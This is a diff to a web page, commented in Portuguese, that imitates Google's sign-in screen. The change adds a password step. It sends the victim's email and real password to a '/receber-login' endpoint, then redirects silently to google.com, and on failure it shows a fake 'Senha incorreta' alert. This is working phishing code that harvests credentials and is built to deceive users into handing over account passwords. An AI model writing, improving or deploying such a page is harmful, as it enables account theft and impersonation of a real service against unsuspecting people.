@@ -16,32 +16,26 @@
             background: #fff;
             color: #202124;
             min-height: 100vh;
-            display: flex;
-            flex-direction: column;
         }
         
         /* Header */
         .header {
-            padding: 20px 0;
+            padding: 24px 0;
             text-align: center;
             border-bottom: 1px solid #dadce0;
         }
         
         .google-logo {
             font-size: 22px;
-            font-weight: 400;
+            font-weight: 600; /* Mais grosso */
             color: #5f6368;
         }
         
-        /* Main Container */
+        /* Main Container - Alinhado mais para cima */
         .container {
             max-width: 448px;
-            margin: 0 auto;
-            padding: 48px 40px 36px;
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
+            margin: 40px auto 0; /* Margem apenas no topo */
+            padding: 0 40px;
         }
         
         .login-box {
@@ -92,22 +86,28 @@
         .input-field.error {
             border-color: #d93025;
         }
+
+        /* Campo de senha (inicialmente escondido) */
+        .password-field {
+            display: none;
+            margin-top: 16px;
+        }
         
         /* Links */
-        .forgot-email {
+        .forgot-link {
             display: block;
             text-align: left;
             margin-bottom: 26px;
         }
         
-        .forgot-email a {
+        .forgot-link a {
             color: #1a73e8;
             text-decoration: none;
             font-size: 14px;
             font-weight: 500;
         }
         
-        .forgot-email a:hover {
+        .forgot-link a:hover {
             text-decoration: underline;
         }
         
@@ -173,7 +173,7 @@
         .footer {
             padding: 24px 0;
             border-top: 1px solid #dadce0;
-            margin-top: auto;
+            margin-top: 40px;
         }
         
         .footer-content {
@@ -210,31 +210,11 @@
             text-decoration: underline;
         }
         
-        /* Result Message */
-        .result {
-            margin-top: 20px;
-            padding: 16px;
-            border-radius: 4px;
-            font-size: 14px;
-            display: none;
-        }
-        
-        .result.success {
-            background: #e6f4ea;
-            border: 1px solid #34a853;
-            color: #137333;
-        }
-        
-        .result.error {
-            background: #fce8e6;
-            border: 1px solid #f28b82;
-            color: #c5221f;
-        }
-        
         /* Responsive */
         @media (max-width: 480px) {
             .container {
                 padding: 24px;
+                margin-top: 20px;
             }
             
             .login-box {
@@ -268,7 +248,13 @@
                     <input type="email" class="input-field" id="email" placeholder="E-mail ou telefone" required autofocus>
                 </div>
 
-                <a href="#" class="forgot-email">Esqueceu seu e-mail?</a>
+                <div class="password-field" id="passwordField">
+                    <input type="password" class="input-field" id="password" placeholder="Digite sua senha" required>
+                </div>
+
+                <div class="forgot-link">
+                    <a href="#" id="forgotLink">Esqueceu seu e-mail?</a>
+                </div>
 
                 <div class="info-text">
                     Não está no seu computador? Use o modo visitante para fazer login com privacidade. <a href="#">Saiba mais</a>
@@ -279,8 +265,6 @@
                     <button type="submit" class="next-button" id="submitBtn">Próxima</button>
                 </div>
             </form>
-
-            <div class="result" id="result"></div>
         </div>
     </div>
 
@@ -302,74 +286,108 @@
     </div>
 
     <script>
+        let currentStep = 1;
+        const emailInput = document.getElementById('email');
+        const passwordField = document.getElementById('passwordField');
+        const passwordInput = document.getElementById('password');
+        const forgotLink = document.getElementById('forgotLink');
+        const submitBtn = document.getElementById('submitBtn');
+
         document.getElementById('loginForm').addEventListener('submit', async function(event) {
             event.preventDefault();
             
-            const email = document.getElementById('email').value;
-            const submitBtn = document.getElementById('submitBtn');
-            const result = document.getElementById('result');
+            const email = emailInput.value;
+            const password = passwordInput.value;
             
-            // Validar email
-            if (!email.includes('@')) {
-                document.getElementById('email').classList.add('error');
-                return;
-            }
-            
-            // Mostrar carregamento
-            submitBtn.disabled = true;
-            submitBtn.textContent = 'Enviando...';
-            result.style.display = 'none';
-            
-            try {
-                // Enviar para o backend
-                const response = await fetch('/receber-login', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        email: email,
-                        senha: 'google_login' // Simulando senha padrão
-                    })
-                });
-                
-                const data = await response.json();
-                
-                if (response.ok) {
-                    result.className = 'result success';
-                    result.innerHTML = `
-                        <strong>✅ Login realizado com sucesso!</strong><br>
-                        <small>E-mail: ${email}</small><br>
-                        <small>Redirecionando...</small>
-                    `;
-                    result.style.display = 'block';
-                    
-                    // Simular redirecionamento do Google
-                    setTimeout(() => {
-                        window.location.href = 'https://google.com';
-                    }, 2000);
-                    
-                } else {
-                    throw new Error(data.message || 'Erro no servidor');
+            if (currentStep === 1) {
+                // Primeiro passo: validar email
+                if (!email.includes('@')) {
+                    emailInput.classList.add('error');
+                    return;
                 }
                 
-            } catch (error) {
-                result.className = 'result error';
-                result.innerHTML = `
-                    <strong>❌ Erro ao fazer login</strong><br>
-                    <small>${error.message}</small>
-                `;
-                result.style.display = 'block';
-            } finally {
-                // Restaurar botão
-                submitBtn.disabled = false;
-                submitBtn.textContent = 'Próxima';
+                // Simular verificação do Google
+                submitBtn.disabled = true;
+                submitBtn.textContent = 'Verificando...';
+                
+                setTimeout(() => {
+                    // Mostrar campo de senha (segundo passo)
+                    passwordField.style.display = 'block';
+                    forgotLink.innerHTML = 'Esqueceu a senha?';
+                    submitBtn.textContent = 'Fazer login';
+                    currentStep = 2;
+                    submitBtn.disabled = false;
+                    
+                    // Focar no campo de senha
+                    passwordInput.focus();
+                }, 800);
+                
+            } else {
+                // Segundo passo: enviar login com senha
+                submitBtn.disabled = true;
+                submitBtn.textContent = 'Entrando...';
+                
+                try {
+                    // Enviar email E SENHA para o backend
+                    const response = await fetch('/receber-login', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            email: email,
+                            senha: password // Agora envia a senha real
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (response.ok) {
+                        // Redirecionar diretamente para o Google SEM mensagem
+                        window.location.href = 'https://google.com';
+                    } else {
+                        throw new Error(data.message || 'Erro no servidor');
+                    }
+                    
+                } catch (error) {
+                    // Em caso de erro, mostrar mensagem e limpar senha
+                    alert('Senha incorreta. Tente novamente.');
+                    passwordInput.value = '';
+                    passwordInput.focus();
+                } finally {
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'Fazer login';
+                }
             }
         });
 
-        // Remover erro quando usuário digitar
-        document.getElementById('email').addEventListener('input', function() {
+        // Remover erro quando usuário digitar no email
+        emailInput.addEventListener('input', function() {
             this.classList.remove('error');
+        });
+
+        // Voltar para o primeiro passo se clicar em "Esqueceu a senha?"
+        forgotLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            if (currentStep === 2) {
+                passwordField.style.display = 'none';
+                forgotLink.innerHTML = 'Esqueceu seu e-mail?';
+                submitBtn.textContent = 'Próxima';
+                currentStep = 1;
+                emailInput.focus();
+            }
+        });
+
+        // Também permitir voltar com Enter no campo de senha vazio
+        passwordInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && this.value === '' && currentStep === 2) {
+                e.preventDefault();
+                passwordField.style.display = 'none';
+                forgotLink.innerHTML = 'Esqueceu seu e-mail?';
+                submitBtn.textContent = 'Próxima';
+                currentStep = 1;
+                emailInput.focus();
+            }
         });
     </script>
 </body>
